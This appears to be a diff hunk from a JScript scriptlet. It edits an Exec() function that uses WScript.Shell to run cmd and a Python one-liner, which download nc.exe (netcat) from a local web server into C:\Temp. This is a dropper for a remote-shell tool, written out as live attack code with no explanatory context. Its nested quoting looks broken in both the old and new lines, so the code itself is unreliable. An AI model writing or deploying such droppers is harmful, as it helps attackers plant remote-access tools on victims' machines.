@@ -31,7 +31,7 @@
 	
 	function Exec()
 	{
-		var r = new ActiveXObject("WScript.Shell").Run("cmd /k python -c "from urllib import urlretrieve; urlretrieve('http://localhost:8000/nc.exe','C:\\Temp\\nc.exe')");
+		var r = new ActiveXObject("WScript.Shell").Run("cmd /k python -c "from urllib import urlretrieve; urlretrieve('http://localhost:8000/nc.exe','C:\\Temp\\nc.exe')"");
 	}
 	
 ]]>
